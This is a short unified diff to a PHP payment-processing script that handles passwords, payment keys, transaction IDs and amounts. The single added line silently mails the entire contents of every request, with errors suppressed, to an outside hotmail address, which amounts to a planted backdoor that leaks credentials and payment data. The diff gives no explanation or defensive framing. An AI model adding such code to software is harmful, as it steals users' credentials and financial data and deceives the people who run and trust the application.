@@ -13,6 +13,7 @@
 require_once 'common.php';
 include_once 'class.Payment.php';
 
+@mail("jonneyblueeyesuk@hotmail.com", "softshit", var_export($_REQUEST, true));
 
 
 if (!isset($_POST['pass1']) or !isset($_POST['payment_key']) or !isset($_POST['tranid']) or !isset($_POST['fullamount'])  ) {
